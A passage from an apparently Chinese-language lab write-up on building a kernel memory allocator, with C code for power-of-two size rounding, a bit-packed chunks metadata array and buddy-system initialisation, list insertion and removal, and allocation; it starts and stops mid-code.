1) &lt; n &lt;= 2 * a</span></span><br><span class="line"><span class="comment">   * 在n为2的幂时，会出现错误</span></span><br><span class="line"><span class="comment">   * 则应该首先--n</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  --n;</span><br><span class="line">  <span class="keyword">while</span>(left &lt;= right) &#123;</span><br><span class="line">    <span class="type">uintptr_t</span> middle = left + (right - left) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(n &gt;&gt; middle) &#123; left = middle + <span class="number">1</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; right = middle - <span class="number">1</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将申请的内存大小向上对齐到最接近的幂</span></span><br><span class="line"><span class="comment"> * 如果小于MINSIZE的内存统一以MINSIZE为主</span></span><br><span class="line"><span class="comment"> * 根据说明，系统中不可能申请超过MAXSIZE大小的内存</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">request_size2mem_size</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  size = ((<span class="type">size_t</span>)<span class="number">1</span>) &lt;&lt; log_ceil(size);</span><br><span class="line"></span><br><span class="line">  panic_on(size &gt; MAXSIZE, <span class="string">&quot;size is too big&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> size &lt; MINSIZE ? MINSIZE : size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="内存块信息存储"><a href="#内存块信息存储" class="headerlink" title="内存块信息存储"></a>内存块信息存储</h3><p>  实际上，对于任意一个内存来说，其除了包含可用的内存地址外，还需要一部分内存，用来保存诸如内存大小等的内存块的信息。<br>  这里由于每次需要对齐，所以类似于ptmalloc2那种的将内存块信息放置在分配的可用内存地址最开始部分是不太可行的。<br>  这里联想到页表机制，从而准备通过类似于bitmap的数组，其每一个元素都代表一片内存的相关属性。</p><h4 id="chunks数组"><a href="#chunks数组" class="headerlink" title="chunks数组"></a>chunks数组</h4><p>  这里最终使用类似于bitmap的chunks数组进行管理。其每一个元素代表着一个页大小的内存<br>  根据前面的内存数据图和内存布局图可知，实际上这个系统中应该包含两块数组(<strong>buddys</strong>和<strong>slabs</strong>)用来管理内存。则chunks中的每一个元素包含两部分信息——当前页所属的内存对象是buddy还是slab；当前页所述的内存对象是否在在使用(slabs数组该字段恒为在使用中)；当前页所述的内存对象在对应数组中的下标。</p><p>  其结构如下所示<br>  <img src="chunks数组元素结构.png" alt="chunks数组元素结构"></p><h4 id="chunks数组初始化"><a href="#chunks数组初始化" class="headerlink" title="chunks数组初始化"></a>chunks数组初始化</h4><p>  实际上，我们需要管理所有可用于分配的内存对象。将这些对象以页为单位，分别对应到<strong>chunks</strong>数组的每一个元素即可。<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 首先需要预留一部分的内存，用来存储管理heap的结构</span></span><br><span class="line"><span class="comment"> * 其次，剩余部分的内存，其起始地址部分应该MAXSIZE大小对齐</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 对于chunks结构来说，其管理所有的可用内存，并且按照1个uintptr_t对应一个页进行管理，</span></span><br><span class="line"><span class="comment"> * 其元素个数不超过     (heap.end - heap.start + PAGESIZE - 1) / PAGESIZE</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">chunks = (<span class="type">uintptr_t</span>*)heap.start;</span><br><span class="line">chunks_size = (((<span class="type">uintptr_t</span>)heap.end) - ((<span class="type">uintptr_t</span>)heap.start) + PAGESIZE - <span class="number">1</span>) / PAGESIZE;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunks: [%X, %X), chunks_size: %D\n&quot;</span>, (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)chunks, (<span class="type">uint64_t</span>)(<span class="type">uintptr_t</span>)(chunks + chunks_size), (<span class="type">uint64_t</span>)chunks_size);</span><br></pre></td></tr></table></figure></p><h4 id="chunks的API"><a href="#chunks的API" class="headerlink" title="chunks的API"></a>chunks的API</h4><p>  根据前面的分析，<strong>chunks</strong>数组就是用来获取当前chunk的诸如大小等信息的。<br>  这里提供了一系列宏。其只需要传入<strong>chunk</strong>地址，即可获取该内存对象的所有信息<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 前面已经描述了chunks每个元素的结构，这里给出操作该结构的宏</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//也就是uintptr_t中，标志位的起始bit位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_FLAG_SIZE                (1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_FLAG_BUDDY               (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_FLAG_SLAB                (1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_STATUS_SIZE              (1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_STATUS_INUSE             (0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_STATUS_UNUSE             (1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_IDX_SIZE                 (sizeof(uintptr_t) * 8 - CHUNKS_STATUS_SIZE - CHUNKS_FLAG_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_IDX_MASK                 ((((uintptr_t)1) &lt;&lt; (CHUNKS_IDX_SIZE)) - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_STATUS_MASK              ((((uintptr_t)1) &lt;&lt; (CHUNKS_IDX_SIZE + CHUNKS_STATUS_SIZE)) - 1 - CHUNKS_IDX_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_FLAG_MASK                ((~((uintptr_t)0)) - CHUNKS_IDX_MASK - CHUNKS_STATUS_MASK)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_VAL_GET_IDX(val)         (((uintptr_t)(val)) &amp; CHUNKS_IDX_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_VAL_GET_STATUS(val)      ((((uintptr_t)(val)) &amp; CHUNKS_STATUS_MASK) &gt;&gt; (CHUNKS_IDX_SIZE))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_VAL_GET_FLAG(val)        ((((uintptr_t)(val)) &amp; CHUNKS_FLAG_MASK) &gt;&gt; (CHUNKS_IDX_SIZE + CHUNKS_STATUS_SIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_VAL_SET_IDX(ptr, val) \</span></span><br><span class="line"><span class="meta">    (*((uintptr_t*)(ptr))) &amp;= (~CHUNKS_IDX_MASK); \</span></span><br><span class="line"><span class="meta">    (*((uintptr_t*)(ptr))) |= (((uintptr_t)(val)) &amp; CHUNKS_IDX_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_VAL_SET_STATUS(ptr, val) \</span></span><br><span class="line"><span class="meta">    (*((uintptr_t*)(ptr))) &amp;= (~CHUNKS_STATUS_MASK); \</span></span><br><span class="line"><span class="meta">    (*((uintptr_t*)(ptr))) |= ((((uintptr_t)(val)) &lt;&lt; (CHUNKS_IDX_SIZE)) &amp; CHUNKS_STATUS_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_VAL_SET_FLAG(ptr, val) \</span></span><br><span class="line"><span class="meta">    (*((uintptr_t*)(ptr))) &amp;= (~CHUNKS_FLAG_MASK); \</span></span><br><span class="line"><span class="meta">    (*((uintptr_t*)(ptr))) |= ((((uintptr_t)(val)) &lt;&lt; (CHUNKS_IDX_SIZE + CHUNKS_STATUS_SIZE)) &amp; CHUNKS_FLAG_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_GET_IDX(addr)                (CHUNKS_VAL_GET_IDX(chunks[(((uintptr_t)(addr)) - chunks_base) / PAGESIZE]))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_GET_STATUS(addr)             (CHUNKS_VAL_GET_STATUS(chunks[(((uintptr_t)(addr)) - chunks_base) / PAGESIZE]))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_GET_FLAG(addr)               (CHUNKS_VAL_GET_FLAG(chunks[(((uintptr_t)(addr)) - chunks_base) / PAGESIZE]))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_SET_IDX(addr, idx)           CHUNKS_VAL_SET_IDX(chunks + ((((uintptr_t)(addr)) - chunks_base) / PAGESIZE), (idx))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_SET_STATUS(addr, status)     CHUNKS_VAL_SET_STATUS(chunks + ((((uintptr_t)(addr)) - chunks_base) / PAGESIZE), (status))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKS_SET_FLAG(addr, flag)         CHUNKS_VAL_SET_FLAG(chunks + ((((uintptr_t)(addr)) - chunks_base) / PAGESIZE), (flag))</span></span><br></pre></td></tr></table></figure></p><h3 id="伙伴算法"><a href="#伙伴算法" class="headerlink" title="伙伴算法"></a>伙伴算法</h3><p>  伙伴算法，或者<strong>Buddy</strong>算法，是一种能有效提高内存利用率，且降低内部碎片的内存管理算法。</p><h4 id="初始化伙伴算法"><a href="#初始化伙伴算法" class="headerlink" title="初始化伙伴算法"></a>初始化伙伴算法</h4><p>  由于伙伴算法涉及到对象的拆分和合并，其往往需要互斥的访问一些共享资源(比如位图等)。因此在本实验中，其属于实验指南中的”slow path”，用来分配大内存或者当用于分配中、小内存的<strong>slab机制</strong>耗尽资源时的内存分配<br>  由于伙伴算法中所有的内存对象都是连续分布的，且其大小都是$2^{i}$;因此只要内存地址最小的内存对象，其内存地址是对齐的，则后面所有的内存地址都是自动对齐的。<br>  分配的时候，由于内存对象位于双向链表的表头数组中，其每一个元素都是大小相同的内存对象组成的双向循环链表，则我们根据内存对象在表头数组中的下标，可以直观的知道该内存对象对应的大小信息;但是在释放的时候，由于内存对象中并没有存储内存的大小信息，但是前面的<strong>chunks</strong>数组中保存内存对象的大小，从而在释放内存对象时，仅仅根据其虚拟地址获取内存对象的大小信息<br>  最后，这里为了避免初始化时间过长，则默认一开始所有的内存对象的大小都是允许分配的最大的内存大小(实验指导中规定的是<strong>16MB</strong>)——这样前面映射数组初始化为对应的下标即可<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 初始化buddys数组</span></span><br><span class="line"><span class="comment"> * 一方面，需要初始化buddys数组中的锁结构，以及其fd、bk值</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 另一方面，要将剩余的所有内存，都切分成MAXSIZE的CHUNK，插入到相关的buddys最后一个数组元素的链表中</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">buddys_init</span><span class="params">(<span class="type">uint64_t</span> start, <span class="type">uint64_t</span> end)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//其start和end必须是MAXSIZE对齐的，从而可以将内存全部分割成MAXSIZE大小的</span></span><br><span class="line">  panic_on(start % MAXSIZE, <span class="string">&quot;error start&quot;</span>);</span><br><span class="line">  panic_on(end % MAXSIZE, <span class="string">&quot;error end&quot;</span>);</span><br><span class="line"></span><br><span class="line">  chunks_base = start;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//首先初始化buddys数组中的索结构，以及fd、bk值</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; buddys_size; ++i) &#123;</span><br><span class="line">    buddys[i].fd = buddys[i].bk = &amp;buddys[i];</span><br><span class="line">    lock_init(&amp;(buddys[i].un.lock));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 依次插入剩余的内存即可</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 首先设置chunks字段相关信息</span></span><br><span class="line"><span class="comment">   * 然后将其插入到链表中即可</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">uintptr_t</span> iter = start; iter &lt; end; iter += MAXSIZE) &#123;</span><br><span class="line">    CHUNKS_SET_IDX(iter, buddys_size - <span class="number">1</span>);</span><br><span class="line">    CHUNKS_SET_STATUS(iter, CHUNKS_STATUS_UNUSE);</span><br><span class="line">    CHUNKS_SET_FLAG(iter, CHUNKS_FLAG_BUDDY);</span><br><span class="line">    </span><br><span class="line">    lock_acquire(&amp;(buddys[buddys_size - <span class="number">1</span>].un.lock));</span><br><span class="line">    list_insert((Chunk*)iter);</span><br><span class="line">    lock_release(&amp;(buddys[buddys_size - <span class="number">1</span>].un.lock));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;buddys_init(%X, %X), MAXSIZE:%X\n&quot;</span>, start, end, (<span class="type">uint64_t</span>)MAXSIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="获取内存"><a href="#获取内存" class="headerlink" title="获取内存"></a>获取内存</h4><p>  对于<strong>Buddy</strong>来说，要从<strong>Buddy</strong>中获取内存:<br>  首先要检查申请大小——其申请的大小至少是<strong>PAGE_SIZE(4096B)</strong>，且最大不超过<strong>MAX_SIZE(16MB)</strong>，并且应该是$2^{i}$对齐的。<br>  其次，获取锁结构，从而互斥的访问——这里需要自旋锁<br>  然后，其从对应的表头数组下标处获取一个内存对象并返回即可;如果当前表头数组下标处没有可用的内存对象，则二分表头数组中最近的更大的内存对象，然后返回即可;如果仍然没有符合条件的，则返回NULL即可<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将chunk插入到链表中</span></span><br><span class="line"><span class="comment"> * 此时的chunk已经完成所有的合并等工作，只需要进行插入即可</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 其需要插入的数组，根据chunks的flag确定即可</span></span><br><span class="line"><span class="comment"> * 其需要插入的数组的下标，根据chunks的idx确定即可</span></span><br><span class="line"><span class="comment"> * 插入的时候，由于需要访问共享数据，需要确认上锁</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">list_insert</span><span class="params">(Chunk *chunk)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//设置chunk的fence值，避免被覆盖</span></span><br><span class="line">  chunk-&gt;un.fence = FENCE;</span><br><span class="line"></span><br><span class="line">  Chunk *head = <span class="literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">switch</span>(CHUNKS_GET_FLAG(chunk)) &#123;</span><br><span class="line">    <span class="keyword">case</span> CHUNKS_FLAG_BUDDY:</span><br><span class="line">      panic_on(CHUNKS_GET_IDX(chunk) &gt;= buddys_size, <span class="string">&quot;error idx&quot;</span>);</span><br><span class="line">      head = &amp;(buddys[CHUNKS_GET_IDX(chunk)]);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> CHUNKS_FLAG_SLAB:</span><br><span class="line">      panic_on(CHUNKS_GET_IDX(chunk) &gt;= slabs_size, <span class="string">&quot;error idx&quot;</span>);</span><br><span class="line">      head = &amp;slabs[chunk-&gt;slabs_cpu_belongs_to][CHUNKS_GET_IDX(chunk)];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      panic(<span class="string">&quot;error flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//需要确认确实已经获取锁了</span></span><br><span class="line">  panic_on(lock_try_acquire(&amp;(head-&gt;un.lock)) != PMMLOCKED, <span class="string">&quot;don&#x27;t have the lock&quot;</span>);</span><br><span class="line"></span><br><span class="line">  CHUNK_CHECK_LIST(head);</span><br><span class="line">  Chunk *bck = head, *fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 将chunk插入到head和head-&gt;fd之间</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  chunk-&gt;bk = bck;</span><br><span class="line">  chunk-&gt;fd = fwd;</span><br><span class="line">  bck-&gt;fd = chunk;</span><br><span class="line">  fwd-&gt;bk = chunk;</span><br><span class="line"></span><br><span class="line">  CHUNK_CHECK_FENCE(chunk);</span><br><span class="line">  CHUNK_CHECK_LIST(chunk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将chunk从其链表上卸下来</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 将链表卸下来的时候，在slabs中，其应该已经获取锁</span></span><br><span class="line"><span class="comment"> * 在buddys中，对于合并的卸载亦或是单纯卸载这一个节点，其锁应该都获取</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 因此，在卸载的时候，其应该已经获取对应数组中的锁了</span></span><br><span class="line"><span class="comment"> * 另一方面，在卸载的时候；如果是buddys数组，应该将其对应的chunks中的元素idx置为CHUNK_IDX_MASK，从而在出错的时候，更容易检查出来</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">list_remove</span><span class="params">(Chunk *chunk)</span></span><br><span class="line">&#123;</span><br><span class="line">  Chunk *head = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">switch</span>(CHUNKS_GET_FLAG(chunk)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> CHUNKS_FLAG_BUDDY:</span><br><span class="line">      panic_on(CHUNKS_GET_IDX(chunk) &gt;= buddys_size, <span class="string">&quot;error idx&quot;</span>);</span><br><span class="line">      head = &amp;buddys[CHUNKS_GET_IDX(chunk)];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> CHUNKS_FLAG_SLAB:</span><br><span class="line">      panic_on(CHUNKS_GET_IDX(chunk) &gt;= slabs_size, <span class="string">&quot;error idx&quot;</span>);</span><br><span class="line">      head = &amp;slabs[chunk-&gt;slabs_cpu_belongs_to][CHUNKS_GET_IDX(chunk)];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      panic(<span class="string">&quot;error flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//需要确认确实已经获取锁了</span></span><br><span class="line">  panic_on(lock_try_acquire(&amp;(head-&gt;un.lock)) != PMMLOCKED, <span class="string">&quot;don&#x27;t have the lock&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查一下完整性</span></span><br><span class="line">  CHUNK_CHECK_FENCE(chunk);</span><br><span class="line">  CHUNK_CHECK_LIST(chunk);</span><br><span class="line"></span><br><span class="line">  Chunk *fwd = chunk-&gt;fd, *bck = chunk-&gt;bk;</span><br><span class="line">  fwd-&gt;bk = bck;</span><br><span class="line">  bck-&gt;fd = fwd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 即从buddy中分配内存</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 其size应该是已经对齐过，并且小于MAXSIZE的</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 分配的时候，就是首先从低向高查询，找到第一个足够分配的内存</span></span><br><span class="line"><span class="comment"> * 如果该内存大小恰好对应申请的size大小，即可返回</span></span><br><span class="line"><span class="comment"> * 如果大于的话，则不停的二分拆分即可，将拆分的高地址一部分保留在buddy中即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> Chunk *</span><br><span class="line"><span class="title function_">buddys_alloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> idx = BUDDY_CHUNK_SIZE2IDX(size);</span><br><span class="line">  <span class="type">uintptr_t</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  panic_on(size &lt; PAGESIZE, <span class="string">&quot;size is too small&quot;</span>);</span><br><span class="line">  panic_on(size &gt; MAXSIZE, <span class="string">&quot;size is too big&quot;</span>);</span><br><span class="line">  panic_on(BUDDY_IDX2CHUNK_SIZE(idx) != size, <span class="string">&quot;size is invalid&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 此时从低向高遍历</span></span><br><span class="line"><span class="comment">   * 找到第一个满足的chunk进行分配</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">int</span> iter = idx;</span><br><span class="line">  <span class="keyword">while</span>(iter &lt; buddys_size) &#123;</span><br><span class="line"></span><br><span class="line">    Chunk *head = &amp;(buddys[iter]);</span><br><span class="line">    lock_acquire(&amp;(head-&gt;un.lock));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(head-&gt;fd != head) &#123;</span><br><span class="line">      res = (<span class="type">uintptr_t</span>)head-&gt;fd;</span><br><span class="line"></span><br><span class="line">      panic_on(CHUNKS_GET_IDX(res) != iter, <span class="string">&quot;error idx&quot;</span>);</span><br><span class="line">      panic_on(CHUNKS_GET_STATUS(res) != CHUNKS_STATUS_UNUSE, <span class="string">&quot;error status&quot;</span>);</span><br><span class="line">      panic_on(CHUNKS_GET_FLAG(res) != CHUNKS_FLAG_BUDDY, <span class="string">&quot;error flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">      CHUNKS_SET_STATUS(res, CHUNKS_STATUS_INUSE);</span><br><span class="line">      list_remove((Chunk*)res);</span><br><span class="line"></span><br><span class="line">      lock_release(&amp;(head-&gt;un.lock));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lock_release(&amp;(head-&gt;un.lock));</span><br><span class="line">    ++iter;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//此时说明内存不足</span></span><br><span class="line">  <span class="keyword">if</span>(res == <span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="literal">NULL</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 开始从高到低的二分的切割chunk</span></span><br><span class="line"><span class="comment">   * 然后设置chunks相关的idx，并且将其放回链表中</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">while</span>(iter-- &gt; idx) &#123;</span><br><span class="line"></span><br><span class="line">    Chunk *chunk = (Chunk*)(<span 